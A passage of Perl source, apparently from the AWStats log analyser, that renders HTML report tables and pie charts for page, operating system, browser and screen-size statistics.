(\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urlexit\")\n\t\t\t: \"$StaticLinks.urlexit.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[116]</a>\";\n\t}\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=SIDER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t\n\t&tab_head( \"$title\", 19, 0, 'urls' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\".Format_Number($TotalDifferentPages).\" $Message[28]</th>\";\n\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[29]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /E/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_e\\\" width=\\\"80\\\">$Message[104]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /X/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_x\\\" width=\\\"80\\\">$Message[116]</th>\";\n\t}\n\n\t# Call to plugins' function ShowPagesAddField\n\tforeach\n\t  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t{\n\n\t\t#\t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('title')\";\n\t\t#\t\t\t\teval(\"$function\");\n\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t&$function('title');\n\t}\n\tprint \"<th>&nbsp;</th></tr>\\n\";\n\tmy $total_p = my $total_e = my $total_x = my $total_k = 0;\n\tmy $max_p   = 1;\n\tmy $max_k   = 1;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \\%_url_p,\n\t\t\\%_url_p );\n\tforeach my $key (@keylist) {\n\t\tif ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }\n\t\tif ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {\n\t\t\t$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );\n\t\t}\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($key);\n\t\tprint \"</td>\";\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_e = 0;\n\t\tmy $bredde_x = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_e =\n\t\t\t  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_x =\n\t\t\t  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth *\n\t\t\t\t  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /\n\t\t\t\t  $max_k ) + 1;\n\t\t}\n\t\tif ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }\n\t\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($_url_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($_url_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_url_k{$key}\n\t\t\t\t? Format_Bytes(\n\t\t\t\t\t$_url_k{$key} / ( $_url_p{$key} || 1 )\n\t\t\t\t  )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname (\n\t\t\tkeys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\n\t\t\t#\t\t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('$key')\";\n\t\t\t#\t\t\t\t\teval(\"$function\");\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function($key);\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_p\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'he'}\\\" width=\\\"$bredde_e\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hx'}\\\" width=\\\"$bredde_x\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\") . \" />\";\n\t\t}\n\t\tprint \"</td></tr>\\n\";\n\t\t$total_p += $_url_p{$key} || 0;\n\t\t$total_e += $_url_e{$key} || 0;\n\t\t$total_x += $_url_x{$key} || 0;\n\t\t$total_k += $_url_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_e = $TotalEntries - $total_e;\n\tmy $rest_x = $TotalExits - $total_x;\n\tmy $rest_k = $TotalBytesPages - $total_k;\n\tif ( $rest_p > 0 || $rest_k > 0 || $rest_e > 0 || $rest_x > 0 )\n\t{    # All other urls\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$rest_k\n\t\t\t\t? Format_Bytes( $rest_k / ( $rest_p || 1 ) )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\" . ( $rest_e ? Format_Number($rest_e) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\" . ( $rest_x ? Format_Number($rest_x) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname (\n\t\t\tkeys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\n\t\t\t#\t\t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('')\";\n\t\t\t#\t\t\t\t\teval(\"$function\");\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function('');\n\t\t}\n\t\tprint \"<td>&nbsp;</td></tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the OS chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainOS{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\n\tif ($Debug) { debug( \"ShowOSStats\", 2 ); }\n\tprint \"$Center<a name=\\\"os\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh   = 0;\n\tmy $Totalp   = 0;\n\tmy %new_os_h = ();\n\tmy %new_os_p = ();\n  OSLOOP: foreach my $key ( keys %_os_h ) {\n\t\t$Totalh += $_os_h{$key};\n\t\t$Totalp += $_os_p{$key};\n\t\tforeach my $family ( keys %OSFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$new_os_h{\"${family}cumul\"} += $_os_h{$key};\n\t\t\t\t$new_os_p{\"${family}cumul\"} += $_os_p{$key};\n\t\t\t\tnext OSLOOP;\n\t\t\t}\n\t\t}\n\t\t$new_os_h{$key} += $_os_h{$key};\n\t\t$new_os_p{$key} += $_os_p{$key};\n\t}\n\tmy $title =\n\"$Message[59] ($Message[77] $MaxNbOf{'OsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=osdetail\")\n\t\t: \"$StaticLinks.osdetail.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=unknownos\")\n\t\t: \"$StaticLinks.unknownos.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\";\n\t  \n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=OS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t  \n\t&tab_head( \"$title\", 19, 0, 'os' );\n\t\n\t&BuildKeyList( $MaxNbOf{'OsShown'}, $MinHit{'Os'}, \\%new_os_h,\n\t\t\\%new_os_p );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int(  $new_os_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t\tif ($key eq 'Unknown'){push @blocklabel, \"$key\"; }\n\t\t\t\telse{\n\t\t\t\t\tmy $keywithoutcumul = $key;\n\t\t\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\t\t\tmy $libos = $OSHashLib{$keywithoutcumul}\n\t\t\t\t\t  || $keywithoutcumul;\n\t\t\t\t\tmy $nameicon = $keywithoutcumul;\n\t\t\t\t\t$nameicon =~ s/[^\\w]//g;\n\t\t\t\t\tif ( $OSFamily{$keywithoutcumul} ) {\n\t\t\t\t\t\t$libos = $OSFamily{$keywithoutcumul};\n\t\t\t\t\t}\n\t\t\t\t\tpush @blocklabel, \"$libos\";\n\t\t\t\t}\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"5\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"Top 5 Operating Systems\",       \"oss\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th>$Message[59]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\t\n\tforeach my $key (@keylist) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p_h = int( $new_os_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($Totalp) {\n\t\t\t$p_p = int( $new_os_p{$key} / $Totalp * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\"\n\t\t\t  . \"<td>\".Format_Number($_os_p{$key}).\"</td><td>$p_p</td><td>\".Format_Number($_os_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libos = $OSHashLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $keywithoutcumul;\n\t\t\t$nameicon =~ s/[^\\w]//g;\n\t\t\tif ( $OSFamily{$keywithoutcumul} ) {\n\t\t\t\t$libos = \"<b>\" . $OSFamily{$keywithoutcumul} . \"</b>\";\n\t\t\t}\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$libos</td><td>\".Format_Number($new_os_p{$key}).\"</td><td>$p_p</td><td>\".Format_Number($new_os_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\t$total_h += $new_os_h{$key};\n\t\t$total_p += $new_os_p{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $Totalh / $total_h\", 2 );\n\t}\n\tmy $rest_h = $Totalh - $total_h;\n\tmy $rest_p = $Totalp - $total_p;\n\tif ( $rest_h > 0 ) {\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }\n\t\tif ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }\n\t\tprint \"<tr>\";\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td><td>\".Format_Number($rest_p).\"</td>\";\n\t\tprint \"<td>$p_p %</td><td>\".Format_Number($rest_h).\"</td><td>$p_h %</td></tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Browsers chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainBrowsers{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowBrowsersStats\", 2 ); }\n\tprint \"$Center<a name=\\\"browsers\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh        = 0;\n\tmy $Totalp        = 0;\n\tmy %new_browser_h = ();\n\tmy %new_browser_p = ();\n  BROWSERLOOP: foreach my $key ( keys %_browser_h ) {\n\t\t$Totalh += $_browser_h{$key};\n\t\t$Totalp += $_browser_p{$key};\n\t\tforeach my $family ( keys %BrowsersFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$new_browser_h{\"${family}cumul\"} += $_browser_h{$key};\n\t\t\t\t$new_browser_p{\"${family}cumul\"} += $_browser_p{$key};\n\t\t\t\tnext BROWSERLOOP;\n\t\t\t}\n\t\t}\n\t\t$new_browser_h{$key} += $_browser_h{$key};\n\t\t$new_browser_p{$key} += $_browser_p{$key};\n\t}\n\tmy $title =\n\"$Message[21] ($Message[77] $MaxNbOf{'BrowsersShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=browserdetail\")\n\t\t: \"$StaticLinks.browserdetail.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=unknownbrowser\")\n\t\t: \"$StaticLinks.unknownbrowser.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\";\n\t  \n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=BROWSER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t  \n\t&tab_head( \"$title\", 19, 0, 'browsers' );\n\t\n\t&BuildKeyList(\n\t\t$MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},\n\t\t\\%new_browser_h,           \\%new_browser_p\n\t);\n\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int(  $new_browser_h{$key} / $TotalHits * 1000 ) / 10;\n\t\t\t\tif ($key eq 'Unknown'){push @blocklabel, \"$key\"; }\n\t\t\t\telse{\n\t\t\t\t\tmy $keywithoutcumul = $key;\n\t\t\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\t\t\tmy $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}\n\t\t\t\t\t  || $keywithoutcumul;\n\t\t\t\t\tmy $nameicon = $BrowsersHashIcon{$keywithoutcumul}\n\t\t\t\t\t  || \"notavailable\";\n\t\t\t\t\tif ( $BrowsersFamily{$keywithoutcumul} ) {\n\t\t\t\t\t\t$libbrowser = \"$libbrowser\";\n\t\t\t\t\t}\n\t\t\t\t\tpush @blocklabel, \"$libbrowser\";\n\t\t\t\t}\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"5\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"Top 5 Browsers\",       \"browsers\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th>$Message[21]</th><th width=\\\"80\\\">$Message[111]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p_h = int( $new_browser_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($Totalp) {\n\t\t\t$p_p = int( $new_browser_p{$key} / $Totalp * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td><td width=\\\"80\\\">?</td>\"\n\t\t\t  . \"<td>\".Format_Number($_browser_p{$key}).\"</td><td>$p_p</td>\"\n\t\t\t  . \"<td>\".Format_Number($_browser_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $BrowsersHashIcon{$keywithoutcumul}\n\t\t\t  || \"notavailable\";\n\t\t\tif ( $BrowsersFamily{$keywithoutcumul} ) {\n\t\t\t\t$libbrowser = \"<b>$libbrowser</b>\";\n\t\t\t}\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">\"\n\t\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t\t  . \"$libbrowser\"\n\t\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" )\n\t\t\t  . \"</td><td>\"\n\t\t\t  . (\n\t\t\t\t$BrowsersHereAreGrabbers{$key}\n\t\t\t\t? \"<b>$Message[112]</b>\"\n\t\t\t\t: \"$Message[113]\"\n\t\t\t  )\n\t\t\t  . \"</td><td>\".Format_Number($new_browser_p{$key}).\"</td><td>$p_p</td><td>\".Format_Number($new_browser_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\t$total_h += $new_browser_h{$key};\n\t\t$total_p += $new_browser_p{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $Totalh / $total_h\", 2 );\n\t}\n\tmy $rest_h = $Totalh - $total_h;\n\tmy $rest_p = $Totalp - $total_p;\n\tif ( $rest_h > 0 ) {\n\t\tmy $p_p = 0.0;\n\t\tmy $p_h;\n\t\tif ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }\n\t\tif ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }\n\t\tprint \"<tr>\";\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td><td>&nbsp;</td><td>$rest_p</td>\";\n\t\tprint \"<td>$p_p %</td><td>$rest_h</td><td>$p_h %</td></tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the ScreenSize chart and table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainScreenSize{\n\tif ($Debug) { debug( \"ShowScreenSizeStats\", 2 ); }\n\tprint \"$Center<a name=\\\"screensizes\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh = 0;\n\tforeach ( keys %_screensize_h ) { $Totalh += $_screensize_h{$_}; }\n\tmy $title =\n\t  \"$Message[135] ($Message[77] $MaxNbOf{'ScreenSizesShown'})\";\n\t&tab_head( \"$title\", 0, 0, 'screensizes' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[135]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count   = 0;\n\t&BuildKeyList( $MaxNbOf{'ScreenSizesShown'},\n\t\t$MinHit{'ScreenSize'}, \\%_screensize_h, \\%_screensize_h );\n\n\tforeach my $key (@keylist) {\n\t\tmy $p = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p = int( $_screensize_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p = \"$p %\";\n\t\t}\n\t\t$total_h += $_screensize_h{$key} || 0;\n\t\tprint \"<tr>\";\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\t\tprint \"<td>$p</td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $screensize = $key;\n\t\t\tprint \"<td class=\\\"aws\\\">$screensize</td>\";\n\t\t\tprint \"<td>$p</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\tmy $rest_h = $Totalh - $total_h;\n\tif ( $rest_h > 0 ) {    # All others sessions\n\t\tmy $p = 0;\n\t\tif ($Totalh) { $p = int( $rest_h / $Totalh * 1000 ) / 10; }\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>\" . ( $rest_h ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Referrers chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainReferrers{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowOriginStats\", 2 ); }\n\tprint \"$Center<a name=\\\"referer\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalp = 0;\n\tforeach ( 0 .. 5 ) {\n\t\t$Totalp +=\n\t\t  ( 